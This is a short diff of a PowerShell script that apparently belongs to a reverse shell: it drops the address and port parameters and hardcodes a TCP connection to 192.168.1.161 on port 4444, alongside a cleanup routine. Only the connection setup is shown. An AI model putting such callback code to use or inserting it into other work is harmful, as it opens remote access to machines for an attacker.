@@ -1,5 +1,3 @@
-param([string]$address, [int]$port)
-
 function CleanUp {
 	if ($client.Connected -eq $true) {
 		$client.Close()
@@ -13,7 +11,7 @@ function CleanUp {
 }
 
 $client = New-Object System.Net.Sockets.TcpClient
-$client.Connect($address, $port)
+$client.Connect('192.168.1.161', 4444)
 
 if ($client.Connected -ne $true) {
 	CleanUp
